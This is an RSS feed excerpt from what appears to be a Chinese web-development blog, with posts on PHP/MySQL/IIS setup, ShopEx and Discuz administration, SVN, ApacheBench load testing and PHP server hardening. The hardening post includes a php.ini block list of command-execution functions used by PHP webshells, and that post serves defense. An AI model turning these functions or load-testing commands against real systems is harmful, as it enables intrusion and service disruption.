Window2003 iis+mysql+php+zend环境配置http://help.aliyun.com/manual?spm=0.0.0.0.E4IlSi&amp;amp;helpId=1237
里面的教程非常详细有图有真相，还有视频呢
就是缺了一个绑定域名的教程，现在补齐http://zhidao.zgsj.com/article/4/2011422142105.shtml
配置只是刚刚开始，服务器的安全也很重要，这个也是之后要学习的啦~~
&amp;nbsp;
IIS服务的命令行方式重启命令 iisreset /RESTART 停止后启动</description>
    </item>
    
    <item>
      <title>MySql中启用InnoDB数据引擎的方法</title>
      <link>https://ifunbox.top/505.html</link>
      <pubDate>Sun, 03 Mar 2013 03:27:57 +0000</pubDate>
      
      <guid>https://ifunbox.top/505.html</guid>
      <description>1、存储引擎是什么?
Mysql中的数据用各种不同的技术存储在文件(或者内存)中。这些技 术中的每一种技术都使用不同的存储机制、索引技巧、锁定水平并且最终提供广泛的不同的功能和能力。通过选择不同的技术，你能够获得额外的速度或者功能，从 而改善你的应用的整体功能。这些不同的技术以及配套的相关功能在MySQL中被称作存储引擎(也称作表类型)。MySql默认配置了许多不同的存储引擎， 可以预先设置或者在MySql服务器中启用。
2、MYSQL支持的数据引擎
MyISAM：默认的MySQL插件式存储引擎，它是在Web、数据仓储和其他应用环境下最常使用的存储引擎之一。
InnoDB：用于事务处理应用程序，具有众多特性，包括ACID事务支持。
BDB：可替代InnoDB的事务引擎，支持COMMIT、ROLLBACK和其他事务特性。
Memory：将所有数据保存在RAM中，在需要快速查找引用和其他类似数据的环境下，可提供极快的访问。
Merge：允许MySQL DBA或开发人员将一系列等同的MyISAM表以逻辑方式组合在一起，并作为1个对象引用它们。对于诸如数据仓储等VLDB环境十分适合。
Archive：为大量很少引用的历史、归档、或安全审计信息的存储和检索提供了完美的解决方案。
Federated：能够将多个分离的MySQL服务器链接起来，从多个物理服务器创建一个逻辑数据库。十分适合于分布式环境或数据集市环境。
Cluster/NDB：MySQL的簇式数据库引擎，尤其适合于具有高性能查找要求的应用程序，这类查找需求还要求具有最高的正常工作时间和可用性。
Other：其他存储引擎包括CSV(引用由逗号隔开的用作数据库表的文件)，Blackhole(用于临时禁止对数据库的应用程序输入)，以及Example引擎(可为快速创建定制的插件式存储引擎提供帮助)。
3、启动InnoDB引擎的方法
Mysql中默认的是MyISAM数据引擎，可惜此引擎不支持事务处理，我们需要将默认的数据引擎改为InnoDB。其中InnoDB和 BerkeleyDB支持事务处理，只是默认的情况下都是被disable的。所有的引擎里面，InnoDB性能最强大，算是商业级的。启动InnoDB引擎的方法如下：
1)关闭mysql的服务
2)修改my.ini
将default-storage-engine=INNODB前的注释(#)去掉
将skip-innodb这行注释(加上#)
3)保存后重启mysql服务
4、MyISAM引擎和InnoDB引擎的基本差别
 MyISAM类型不支持事务处理等高级处理，而InnoDB类型支持。 MyISAM类型的表强调的是性能，其执行数度比InnoDB类型更快，但是不提供事务支持，而InnoDB提供事务支持已经外部键等高级数据库功能。 MyIASM是IASM表的新版本，有如下扩展：二进制层次的可移植性、NULL列索引、对变长行比ISAM表有更少的碎片、支持大文件、更好的索引压缩等 InnoDB不支持FULLTEXT类型的索引 InnoDB 中不保存表的具体行数 对于AUTO_INCREMENT类型的字段，InnoDB中必须包含只有该字段的索引，但是在MyISAM表中，可以和其他字段一起建立联合索引 DELETE FROM table时，InnoDB不会重新建立表，而是一行一行的删除 …………  这些区别能够影响应用程序的性能和功能，因此你必须针对业务类型来选择合适的引擎，才能最大的发挥MySQL的性能优势。</description>
    </item>
    
    <item>
      <title>在xp、apache环境中安装PHP Mcrypt.so加密扩展库教程</title>
      <link>https://ifunbox.top/501.html</link>
      <pubDate>Sat, 02 Mar 2013 15:16:12 +0000</pubDate>
      
      <guid>https://ifunbox.top/501.html</guid>
      <description>PHP程序员们在编写代码程序时，除了要保证代码的高性能之外，还有一点是非常重要的，那就是程序的安全性保障。PHP除了自带的几种加密函数外，还有功能更全面的PHP加密扩展库Mcrypt和Mhash。
其中，Mcrypt扩展库可以实现加密解密功能，就是既能将明文加密，也可以密文还原。
更重要的是ShopEX更新需要Mcrypt加密扩展库的支持~~
在标准的PHP安装过程中并没有把Mrcypt安装上，但PHP的主目录下包含了libmcrypt.dll和libmhash.dll文件。
1.将libmcrypt.dll复制到system32目录下
2.将libmcrypt.dll复制到apache安装目录的bin目录下 
3.在 PHP.ini文件中按Ctrl+F快捷键跳出查找框，并找到;extension=php-mcrypt.dll和; extension=php_mhash.dll这两个语句，接着将前面的“;”去掉；
4.最后，保存并重启Apache服务器即可生效。
linux上安装比较复杂，与xp安装不同，在win7上用此种方法安装貌似会失效，原因不详~~</description>
    </item>
    
    <item>
      <title>利用百度地图api通过城市地址等信息取经纬度</title>
      <link>https://ifunbox.top/498.html</link>
      <pubDate>Thu, 28 Feb 2013 10:19:50 +0000</pubDate>
      
      <guid>https://ifunbox.top/498.html</guid>
      <description>Geocoding API有哪些功能？ Geocoding API包括地址解析和逆地址解析功能。
 地址解析是指，由详细到街道的结构化地址得到百度经纬度信息，且支持名胜古迹、标志性建筑名称直接解析返回百度经纬度。例如：“北京市海淀区中关村南大街27号”地址解析的结果是“lng:116.31985,lat:39.959836”，“百度大厦”地址解析的结果是“lng:116.30815,lat:40.056885” 逆地址解析是指，由百度经纬度信息得到结构化地址信息。例如：“lat:31.325152,lng:120.558957”逆地址解析的结果是“江苏省苏州市虎丘区塔园路318号”。注意： 1.因为Geocoding和反Geocoding使用的门址数据以及算法都不是一样的，所以会出现不能一一对应的现象。
2.解析过程中可能会出现一对坐标值对应多个地址门牌信息，本接口将返回距离坐标点最近的一个地址门牌信息。
使用限制 目前无任何使用限制。请申请key，然后使用该接口。
如何使用 第一步，申请key，点击这里获取密钥，申请key需要注册百度账号；
第二步，拼写发送http请求的url，注意需使用第一步申请的key；
第三步，接收http请求返回的数据（支持json和xml格式）。
服务地址  地址解析：根据地址获取坐标   http://api.map.baidu.com/geocoder?address=地址&amp;amp;output=输出格式类型&amp;amp;key=用户密钥&amp;amp;city=城市名
 逆地址解析：根据坐标获取地址   http://api.map.baidu.com/geocoder?location=纬度,经度&amp;amp;output=输出格式类型&amp;amp;key=用户密钥
备注：
 city属于可选参数，通常情况可以不使用，若解析无结果，请尝试增加此字段。
 支持名胜古迹、标志性建筑物名称解析返回百度经纬度坐标，如address=“百度大厦”。
 支持使用“*路与*路交叉口”方式解析返回百度经纬度坐标，若地址库中存在该地址描述，返回百度经纬度坐标。
 若解析status字段为OK，若结果内容为空，原因分析及可尝试方法：
 地址库里无此数据，本次结果为空。 加入city字段重新解析； 将过于详细或简单的地址更改至省市区县街道重新解析；   特别提醒：逆地址解析location参数传入的参数格式是(纬度lat，经度lng)。
  接口参数   参数  是否必须  默认值  格式举例  含义     output   否   json   json或xml   输出格式为json或者xml     address   是   无   北京市海淀区上地十街10号   根据指定地址进行坐标的反定向解析     location   是   无   38.</description>
    </item>
    
    <item>
      <title>新浪通过IP地址获取当前地理位置（ip端、国家、省份、城市、运营商）的php接口</title>
      <link>https://ifunbox.top/496.html</link>
      <pubDate>Thu, 28 Feb 2013 10:15:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/496.html</guid>
      <description>新浪通过IP地址获取当前地理位置（ip端、国家、省份、城市、运营商）的php接口很强大呢
返回的方式多种多样
默认为html，format参数可以为json、js。
http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json
{&amp;quot;ret&amp;quot;:1,&amp;quot;start&amp;quot;:&amp;quot;222.76.250.147&amp;quot;,&amp;quot;end&amp;quot;:&amp;quot;222.76.255.255&amp;quot;,&amp;quot;country&amp;quot;:&amp;quot;\u4e2d\u56fd&amp;quot;,&amp;quot;province&amp;quot;:&amp;quot;\u798f\u5efa&amp;quot;,&amp;quot;city&amp;quot;:&amp;quot;\u53a6\u95e8&amp;quot;,&amp;quot;district&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;isp&amp;quot;:&amp;quot;\u7535\u4fe1&amp;quot;,&amp;quot;type&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;desc&amp;quot;:&amp;quot;&amp;quot;}  http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js
var remote_ip_info = {&amp;quot;ret&amp;quot;:1,&amp;quot;start&amp;quot;:&amp;quot;222.76.250.147&amp;quot;,&amp;quot;end&amp;quot;:&amp;quot;222.76.255.255&amp;quot;,&amp;quot;country&amp;quot;:&amp;quot;\u4e2d\u56fd&amp;quot;,&amp;quot;province&amp;quot;:&amp;quot;\u798f\u5efa&amp;quot;,&amp;quot;city&amp;quot;:&amp;quot;\u53a6\u95e8&amp;quot;,&amp;quot;district&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;isp&amp;quot;:&amp;quot;\u7535\u4fe1&amp;quot;,&amp;quot;type&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;desc&amp;quot;:&amp;quot;&amp;quot;};  </description>
    </item>
    
    <item>
      <title>禁止浏览器复制剪切</title>
      <link>https://ifunbox.top/494.html</link>
      <pubDate>Wed, 27 Feb 2013 13:46:28 +0000</pubDate>
      
      <guid>https://ifunbox.top/494.html</guid>
      <description>&amp;nbsp;

&amp;nbsp;
就那么简单 😯</description>
    </item>
    
    <item>
      <title>Discuz! Debug 模式的开启与使用</title>
      <link>https://ifunbox.top/489.html</link>
      <pubDate>Wed, 27 Feb 2013 03:42:48 +0000</pubDate>
      
      <guid>https://ifunbox.top/489.html</guid>
      <description>1.面向对象：
有一定mysql基础的站长，程序开发者
2.作用：
可以明细的列出当前页面的查询可以具体查询出现的文件，和时间。并且有查询的 explain 信息。便于检查哪里出现了慢查询。
可以查看当前页面内存使用情况
可以列出当前页面 $_G 变量中的内容
可以列出当前页面的 cookie 内容
可以查看当前浏览器的信息，User Agent 等

3.所需文件：
解压，将 function_debug.php 放到 source/function 目录下。

4.修改配置文件：
修改 config\config_global.php 
在 $_config[&amp;#8216;remote&amp;#8217;][&amp;#8216;cron&amp;#8217;] = 1; 后加入一行：
$_config[&amp;#8216;debug&amp;#8217;] = 1;
则，每个页面都将开启 debug 模式。

如果修改为：
$_config[&amp;#8216;debug&amp;#8217;] = &amp;#8216;debug&amp;#8217;;


则不是每个页面都显示 debug 信息只有在 url 后面加上 &amp;amp;debug=debug 才会显示，这就可以避免普通用户也看到 debug 信息了。

5.debug 信息解释

下载地址http://url.cn/AZnkRO</description>
    </item>
    
    <item>
      <title>ShopNC开发腾付通、宝付支付接口心得体会</title>
      <link>https://ifunbox.top/485.html</link>
      <pubDate>Tue, 26 Feb 2013 04:19:45 +0000</pubDate>
      
      <guid>https://ifunbox.top/485.html</guid>
      <description>api\payment下每一个文件夹都对应一个支付接口，如alipay是支付宝
api\payment\payment.inc.php里面配置当前在使用的支付接口，新建一个支付接口也需要配置
以alipay为例，简单的介绍一下shopnc的支付接口
logo.gif支付方式图标
alipay.php接口类
info.php接口配置信息
notify_url.php异步返回
return_url.php同步通知
alipay.php接口类中的方法get_payurl()是构造以get的方式传值支付链接(注有是用POST传值可以参考网银在线接口)
处理返回的数据：
通过notify_url.php调用了控制类payment.php的notify()方法，该方法无非就是检查了订单状态、签名验证( 通过alipay.php接口类中的方法notify_verify() )、修改订单状态
return_url.php与notify_url.php差不多~~
这样大概流程都在上面啦，各位可以去实践下~~
需要shopnc腾付通支付接口、shopnc宝付支付接口可以联系我哦~QQ:614944530~</description>
    </item>
    
    <item>
      <title>最全discuz X2 DB数据库类详细说明</title>
      <link>https://ifunbox.top/471.html</link>
      <pubDate>Thu, 21 Feb 2013 06:18:39 +0000</pubDate>
      
      <guid>https://ifunbox.top/471.html</guid>
      <description>discuzX 系列的db数据库类写的已经非常好了，从性能、安全性和易用性上都做的非常优秀了。
了解discuzX 系列的db数据库类，不仅可以使我们能快速上手二次开发，也可以移植到自己的项目中来。
下面我们来分析讲解一下db数据类：
&amp;lt;?php class DB { /** * 返回表名(pre_$table) * * @param 原始表名 $table * @return 增加pre之后的名字 */ function table($table) { return DB::_execute(&#39;table_name&#39;, $table); } /** * 删除一条或者多条记录 * * @param string $table 原始表名 * @param string $condition 数组的形式，条件语句，不需要写WHERE * @param int $limit 删除条目数 * @param boolean $unbuffered 可以参考php自带的mysql_unbuffered_query()函数 */ function delete($table, $condition, $limit = 0, $unbuffered = true) { if(empty($condition)) { $where = &#39;1&#39;; } elseif(is_array($condition)) { $where = DB::implode_field_value($condition, &#39; AND &#39;); } else { $where = $condition; } $sql = &amp;quot;DELETE FROM &amp;quot;.</description>
    </item>
    
    <item>
      <title>MySQL中insert into、insert ignore into和replace into的使用区别</title>
      <link>https://ifunbox.top/467.html</link>
      <pubDate>Thu, 21 Feb 2013 02:51:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/467.html</guid>
      <description>mysql中insert into和replace into以及insert ignore用法区别：
mysql中常用的三种插入数据的语句:
insert into表示插入数据，数据库会检查主键，如果出现重复会报错；
replace into表示插入替换数据，需求表中有PrimaryKey，或者unique索引，如果数据库已经存在数据，则用新数据替换，如果没有数据效果则和insert into一样；
insert ignore表示，如果中已经存在相同的记录，则忽略当前新数据；  &amp;nbsp;  replace into 跟 insert 功能类似，不同点在于：replace into 首先尝试插入数据到表中， 1. 如果发现表中已经有此行数据（根据主键或者唯一索引判断）则先删除此行数据，然后插入新的数据。 2. 否则，直接插入新数据。  &amp;nbsp;  要注意的是：插入数据的表必须有主键或者是唯一索引！否则的话，replace into 会直接插入数据，这将导致表中出现重复的数据。
下面通过代码说明之间的区别，如下： ``` create table testtb( id int not null primary key, name varchar(50), age int ); insert into testtb(id,name,age)values(1,&#34;bb&#34;,13); select * from testtb; insert ignore into testtb(id,name,age)values(1,&#34;aa&#34;,13); select * from testtb;//仍是1，“bb”,13，因为id是主键，出现主键重复但使用了ignore则错误被忽略 replace into testtb(id,name,age)values(1,&#34;aa&#34;,12); select * from testtb; //数据变为1,&#34;</description>
    </item>
    
    <item>
      <title>Discuz! 的编码规范</title>
      <link>https://ifunbox.top/463.html</link>
      <pubDate>Tue, 19 Feb 2013 06:59:57 +0000</pubDate>
      
      <guid>https://ifunbox.top/463.html</guid>
      <description>前言  本规范由编程原则组成，融合并提炼了开发人员长时间积累下来的成熟经验，意在帮助形成良好一致的编程风格。  适用范围  如无特殊说明，以下规则要求完全适用于Discuz!项目，同时也可大部分适用于COMSENZ旗下其他PHP项目。  标准化的重要性和好处  当一个软件项目尝试着遵守公共一致的标准时，可以使参与项目的开发人员更容易了解项目中的代码、弄清程序的状况。使新的参与者可以很快的适应环境，防止部分参与者出于节省时间的需要，自创一套风格并养成终生的习惯，导致其它人在阅读时浪费过多的时间和精力。而且在一致的环境下，也可以减少编码出错的机会。缺陷是由于每个人的标准不同，所以需要一段时间来适应和改变自己的编码风格，暂时性的降底了工作效率。从使项目长远健康的发展以及后期更高的团队工作效率来考虑暂时的工作效率降低是值得的，也是必须要经过的一个过程。标准不是项目成功的关键，但可以帮助我们在团队协作中有更高的效率并且更加顺利的完成既定的任务。
 * 程序员可以了解任何代码，弄清程序的状况  新人可以很快的适应环境 防止新接触PHP的人出于节省时间的需要，自创一套风格并养成终生的习惯 防止新接触PHP的人一次次的犯同样的错误 在一致的环境下，人们可以减少犯错的机会 程序员们有了一致的敌人    PHP编码规范与原则 代码标记  PHP程序可以使用&amp;lt;?php ?&amp;gt;来界定 PHP 代码，在HTML页面中嵌入纯变量时，可以使用&amp;lt;?php echo $variablename;?&amp;gt;这样的形式。 注意：为了使代码进一步规范化和标准化，从Discuz! X2版本起开始禁用&amp;lt;? ?&amp;gt;和&amp;lt;?=$variablename?&amp;gt;这种速记形式。  注释  注释是对于那些容易忘记作用的代码添加简短的介绍性内容。请使用 C 样式的注释“/* */”和标准 C++ 注释“//”。 在Discuz!每一个程序文件头部中，应放入相应SVN控制字串，以方便SVN提交时自动更新：
 $Id$   例如：
/** * [Discuz!] (C)2001-2099 Comsenz Inc. * This is NOT a freeware, use is subject to license terms * * $Id$ */   程序开发中难免留下一些临时代码和调试代码，此类代码必须添加注释，以免日后遗忘。所有临时性、调试性、试验性的代码，必须添加统一的注释标记“//debug”并后跟完整的注释信息，这样可以方便在程序发布和最终调试前批量检查程序中是否还存在有疑问的代码。例如：</description>
    </item>
    
    <item>
      <title>SVN菜单中文详解</title>
      <link>https://ifunbox.top/459.html</link>
      <pubDate>Tue, 19 Feb 2013 01:43:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/459.html</guid>
      <description>01、SVN Checkout(SVN取出)
点击SVN Checkout，弹出检出提示框，在URL of repository输入框中输入服务器仓库地址，在Checkout directory输入框中输入本地工作拷贝的路径，点击确定，即可检出服务器上的配置库。
02、SVN Update(SVN更新)
如果配置库在本地已有工作拷贝，则取得最新版本只是执行SVN Update即可，点击SVN Update，系统弹出更新提示框，点击确定，则把服务器是最新版本更新下来
03、Import（导入）
选择要提交到服务器的目录，右键选择TortoiseSVN&amp;#8212;-Import，系统弹出导入提示框，在URL of repository输入框中输入服务器仓库地址，在Import Message输入框中输入导入日志信息，点击确定，则文件导入到服务器仓库中。
04、Add(加入)
如果有多个文件及文件夹要提交到服务器，我们可以先把这些要提交的文件加入到提交列表中，要执行提交操作，一次性把所有文件提交，如图，可以选择要提交的文件，然后点击执行提交（SVN Commit）,即可把所有文件一次性提交到服务器上
05、Resolving Conflicts(解决冲突)
有时你从档案库更新文件会有冲突。冲突产生于两人都修改文件的某一部分。解决冲突只能靠人而不是机器。当产生冲突时，你应该打开冲突的文件，查找以&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;开始的行。冲突部分被标记：
&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; filename
your changes
=======
code merged from repository
&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; revision
Subversion为每个冲突文件产生三个附加文件：
filename.ext.mine
更新前的本地文件。
filename.ext.rOLDREV
你作改动的基础版本。
filename.ext.rNEWREV
更新时从档案库得到的最新版本。
使用快捷菜单的编辑冲突Edit Conflict命令来解决冲突。然后从快捷菜单中执行已解决Resolved命令，将改动送交到档案库。请注意，解决命令并不解决冲突，而仅仅是删除filename.ext.mineandfilename.ext.r*文件并允许你送交。
06、Check for Modifications（检查更新）
点击Check for Modifications,系统列表所以待更新的文件及文件夹的状态.
07、Revision Graph(版本分支图)
查看文件的分支,版本结构,可以点击Revision Graph,系统以图形化形式显示版本分支.
08、Rename(改名)
SVN支持文件改名,点击Rename,弹出文件名称输入框,输入新的文件名称,点击确定,再把修改提交,即可完成文件改名
09、Delete(删除)
SVN支持文件删除,而且操作简单,方便,选择要删除的文件,点击Delete,再把删除操作提交到服务器
10、Moving(移动)
选择待移动的文件和文件夹；按住右键拖动right-drag文件（夹）到跟踪拷贝内的新地方；松开左键；在弹出菜单中选择move files in Subversion to here
11、Revert(还原)
还原操作,如刚才对文件做了删除操作,现在把它还原回来,点击删除后,再点击提交,会出现如上的提示框,点击删除后,再点击Revert,即已撤销删除操作,如果这时候点击提交,则系统弹出提示框:没有文件被修改或增加,不能提交
12、Branch/Tag(分支/标记)
当需要创建分支，点击Branch/Tag，在弹出的提示框中，输入分支文件名，输入日志信息，点击确定，分支创建成功，然后可查看文件的版本分支情况
13、Switch(切换)
文件创建分支后，你可以选择在主干工作，还是在分支工作，这时候你可以通过Switch来切换。</description>
    </item>
    
    <item>
      <title>shopex安全设置指南(如何设置shopex保障网站安全教程)</title>
      <link>https://ifunbox.top/451.html</link>
      <pubDate>Fri, 01 Feb 2013 06:19:21 +0000</pubDate>
      
      <guid>https://ifunbox.top/451.html</guid>
      <description>Shopex是一个比较成熟、优秀的网店销售平台。由于该系统在国内使用的普遍性，也成为黑客攻击的目标，也由于该系统的特殊性，网站数据安全就显非常重要，网站一旦被黑，不仅会影响正常的营业时间，而且还会危及到客户数据、交易数据的安全。 关于Shopex网店系统的安全设置使用的教程还非常少，官方网站上也没有专门的针对shopex网站安全使用设置有一个明确的教程， 那怎么设置shopex才能最大限度的保障网站安全呢？ 本人特为各位老板提点小小的建议。 1、 密码保护。不要为了方便登录，而使用简单密码。请设置字母加数字加特殊符号为组合的复杂密码，这样就大大增加了黑客的破解MD5密码的难度。 2、 如果你的网站出现问题或者功能开发的要求，需要维护、二次开发，请选择正规的公司或官方工程师为你处理(愿意为您效劳)，请不要随便相信那些打着免费、低价解决故障的人为你解决网站故障。这些人，往往是带着其它目的给你解决问题的。你把管理员密码和ftp帐号密码提供给这样的人，安装盗版免费插件，网站都可能被挂马、挂后门。 3、 关注官方网站，及时升级、打补丁。 4、 用户经常会忘记的事情，修改网站管理员后台登录地址。shopadmin改成不容易被黑客猜出的名字。 5、数据库表前缀名默认是sdb，这个也要改成不容易被黑客猜出的名字。 6、给文件适当的权限 api 可读不可写可运行 config 可读不可写可运行 core 可读不可写可运行 home 可读可写可运行 home/ upload可读可写不可运行  fanhefan_core（二次开发目录，名字可能不一样）可读不可写可运行 images 可读可写不可运行  install 删除 plugins 可读可写可运行(如果您插件支付接口都安装好了，可以改成不可写) public 可读可写不可运行（这个文件夹一般都是空的） shopadmin 改文件夹名，可读不可写可运行 statics 可读可写不可运行（如果网站的界面图片css不更改了，可以改成不可写） themes 可读可写不可运行（如果网站的HTML模板图片css不更改了，可以改成不可写） 7、 最后，请定期备份数据。 </description>
    </item>
    
    <item>
      <title>Windows下Apache服务器自带Ab.exe的压力测试方法</title>
      <link>https://ifunbox.top/windows-apache-ab/</link>
      <pubDate>Wed, 30 Jan 2013 08:48:26 +0000</pubDate>
      
      <guid>https://ifunbox.top/windows-apache-ab/</guid>
      <description>ab是Apache自带的HTTP压力测试工具，全称是ApacheBench，同微软的WAST、惠普的LoadRunner、QALoad等比起来，它要方便易用得多
ab是Apache的一个安装组件,所以需要下载Apache安装后才能使用，该命令位于Apache安装目录下的bin文件夹中
ab是专门用于HTTP Server的benchmark testing，可以同时模拟多个并发请求
ab的设计意图是描绘当前所安装的Apache的执行性能,主要是显示所安装的Apache每秒可以处理多少个请求
ab不像LR那么强大,但它足够轻便,若只是在开发过程中想检查一下某个模块的响应情况，或者做一些场景比较简单的测试，ab是个不错的选择
至少不用花费很多时间去学习LR中的那些复杂的功能,就更别说那License的价格了
参数文档：
http://httpd.apache.org/docs/2.2/programs/ab.html
通过对服务器压力测试可以大概了解一个服务器的负载能力，下面是Windows下的Apache服务器测试方法。
在Apache服务器自带了一个测试程序Ab.exe可以很方便的使用 。。
命令是 ab -c 一次产生的请求个数（并发数） -n 在测试会话中所执行的请求个数 网址（建议输入目标网页）。。
线程数不宜过大 按照你电脑的承受能力 。。。
请求数有限制 防止有人乱Ddos别人 。。
例：ab -n 10 -c 10 http://192.168.1.3/index.html
结果如下 。。
D:\Apache\bin&amp;gt;ab -n 10 -c 10 http://192.168.1.3/index.html
（以上是输入的命令）
Benchmarking 192.168.1.3 (be patient)&amp;#8230;..done
Server Software: Apache/2.0.63
（目标服务器Apache版本号）
Server Hostname: 192.168.1.3
（目标服务器主机头名称）
Server Port: 80
（目标服务器Apache端口）
Document Path: /index.html
（目标网页相对地址）
Document Length: 292 bytes
（目标网页大小）
Concurrency Level: 10
（并发线程数）</description>
    </item>
    
    <item>
      <title>解决ShopEx云登录 登录成功后返回无反应错误的方法</title>
      <link>https://ifunbox.top/432.html</link>
      <pubDate>Tue, 27 Nov 2012 08:02:02 +0000</pubDate>
      
      <guid>https://ifunbox.top/432.html</guid>
      <description>云登录返回时ShopEx系统会调用core\shop\controller\ctl.passport.php下的方法other_login_verify代码如下
function other_login_verify(){ $sign = $_GET[&#39;sign&#39;]; unset($_GET[&#39;passport-other_login_verify_html&#39;]); unset($_GET[&#39;passport-1-other_login_verify_html&#39;]); unset($_GET[&#39;sign&#39;]); $make_sign = $this-&amp;amp;gt;get_ce_sign($_GET,$this-&amp;amp;system-&amp;amp;gt;getConf(&#39;certificate.token&#39;)); if($make_sign!=$sign){ echo &amp;quot;sign is error&amp;quot;; exit; } $account = $this-&amp;amp;system-&amp;amp;gt;loadModel(&#39;member/account&#39;); //查询sdb_trust_login是否之前登录过，首次登录会插入会员信息，不是首次就读取 $result_m = $account-&amp;amp;gt;createotherlogin($_GET); if($result_m[&#39;redirect_url&#39;]){ echo &amp;quot;&amp;quot;; exit; }else{ echo &amp;quot;&amp;quot;; } }  程序流程是先检查sdb_trust_login表，如果没有用户信息说明是第一次登录，系统就会读取系统后台设置默认的会员信息，比如等级、默认货币单位等等，然后结合信任登录返回会员信息（如昵称、邮箱信息等等）一起在sdb_members表里生成新的一条会员记录。如果有用户信息说明不是第一次登录，系统会读取之前导入的会员记录。
问题出在如果你删除了信任登录会员，这里的删除指的是永久删除，由于程序bug，sdb_trust_login表的信息没有被一起删除，如果被删除会员下次又用登录，系统会认为该会员不是第一次登录，直接读取已经被删除不存在的会员信息，就会出现，云登录成功返回后，会员没有登录网站的尴尬。
解决方法，找到sdb_members表中删除云登录会员的id，然后删除sdb_trust_login表内对应的信息即可。
不过我建议不要删除云登录，信任登录的会员信息，以免有不必要的麻烦。</description>
    </item>
    
    <item>
      <title>shopex短信无法发送问题解决方案总结</title>
      <link>https://ifunbox.top/421.html</link>
      <pubDate>Wed, 07 Nov 2012 01:58:23 +0000</pubDate>
      
      <guid>https://ifunbox.top/421.html</guid>
      <description>最近网站又发现shopex短信无法发送的问题，很苦恼先是重新上传了core文件，又上传短信sms安装包文件覆盖，问题依旧。
咨询了下shopex短信客服，现在记录下自己解决shopex短信无法发送的终极方案。
1.备份shopex数据库，文件。这个是必须的啦。
2.进入数据库删除数据表sdb_settings下的s_name字段值为enterprise的记录
3.上传最新的core，然后上传最新的shopex短信通安装包。
4.重新安装shopex短信通功能，如果您的后台改了地址，需要改成shopadmin。
5.在配置文件中禁掉二次开发的目录，然后登陆后台，系统会提示输入shopexid以及密码重新安装shopex短信通功能。安装成功后，一般shopex短信无法发送的问题立即解决。
我还发现一个问题，这个操作后，之前系统因为安装shopex短信通功能而导致一直提示证书错误的问题也解决了~</description>
    </item>
    
    <item>
      <title>防御PHP木马攻击的技巧 PHP安全第一课</title>
      <link>https://ifunbox.top/410.html</link>
      <pubDate>Fri, 19 Oct 2012 07:16:34 +0000</pubDate>
      
      <guid>https://ifunbox.top/410.html</guid>
      <description>PHP本身再老版本有一些问题，比如在 php4.3.10和php5.0.3以前有一些比较严重的bug，所以推荐使用新版。另外，目前闹的轰轰烈烈的SQL Injection也是在PHP上有很多利用方式，所以要保证安全，PHP代码编写是一方面，PHP的配置更是非常关键。
我们php手手工安装的，php的默认配置文件在 /usr/local/apache2/conf/php.ini，我们最主要就是要配置php.ini中的内容，让我们执行php能够更安全。整个 PHP中的安全设置主要是为了防止phpshell和SQL Injection的攻击，一下我们慢慢探讨。我们先使用任何编辑工具打开/etc/local/apache2/conf/php.ini，如果你 是采用其他方式安装，配置文件可能不在该目录。
(1) 打开php的安全模式
php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如system()，
同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的文件，比如/etc/passwd，
但是默认的php.ini是没有打开安全模式的，我们把它打开：
safe_mode = on
(2) 用户组安全
当safe_mode打开时，safe_mode_gid被关闭，那么php脚本能够对文件进行访问，而且相同
组的用户也能够对文件进行访问。
建议设置为：
safe_mode_gid = off
如果不进行设置，可能我们无法对我们服务器网站目录下的文件进行操作了，比如我们需要
对文件进行操作的时候。
(3) 安全模式下执行程序主目录
如果安全模式打开了，但是却是要执行某些程序的时候，可以指定要执行程序的主目录：
safe_mode_exec_dir = D:/usr/bin
一般情况下是不需要执行什么程序的，所以推荐不要执行系统程序目录，可以指向一个目录，
然后把需要执行的程序拷贝过去，比如：
safe_mode_exec_dir = D:/tmp/cmd
但是，我更推荐不要执行任何程序，那么就可以指向我们网页目录：
safe_mode_exec_dir = D:/usr/www
(4) 安全模式下包含文件
如果要在安全模式下包含某些公共文件，那么就修改一下选项：
safe_mode_include_dir = D:/usr/www/include/
其实一般php脚本中包含文件都是在程序自己已经写好了，这个可以根据具体需要设置。
(5) 控制php脚本能访问的目录
使用open_basedir选项能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问
不应该访问的文件，一定程度上限制了phpshell的危害，我们一般可以设置为只能访问网站目录：
open_basedir = D:/usr/www
(6) 关闭危险函数
如果打开了安全模式，那么函数禁止是可以不需要的，但是我们为了安全还是考虑进去。比如，
我们觉得不希望执行包括system()等在那的能够执行命令的php函数，或者能够查看php信息的
phpinfo()等函数，那么我们就可以禁止它们：
disable_functions = system,passthru,exec,shell_exec,popen,phpinfo
如果你要禁止任何文件和目录的操作，那么可以关闭很多文件操作
disable_functions = chdir,chroot,dir,getcwd,opendir,readdir,scandir,fopen,unlink,delete,copy,mkdir, rmdir,rename,file,file_get_contents,fputs,fwrite,chgrp,chmod,chown
以上只是列了部分不叫常用的文件处理函数，你也可以把上面执行命令函数和这个函数结合，
就能够抵制大部分的phpshell了。</description>
    </item>
    
    <item>
      <title>批量mysql修改表前缀，以wordpress为例</title>
      <link>https://ifunbox.top/404.html</link>
      <pubDate>Thu, 06 Sep 2012 06:59:17 +0000</pubDate>
      
      <guid>https://ifunbox.top/404.html</guid>
      <description>以wordpress数据库表为例。
1、先登入你的phpmyadmin中，选中你的wordpress数据库,选择sql出现如下图，然后输入sql命令
Select CONCAT(&amp;#8216;ALTER TABLE &amp;#8216;, table_name, &amp;#8216; RENAME TO &amp;#8216;, table_name,&amp;#8217;;&amp;#8217; ) FROM information_schema.tables Where tablename LIKE &amp;#8216;wp%&amp;#8217;; 
得到结果：
ALTER TABLE wp_xyz RENAME TO wp_xyz;
ALTER TABLE wp_opq RENAME TO wp_opq; 
(假设数据里有两个表： wp_xyz 、 wp_opq，前缀都是wp ) 
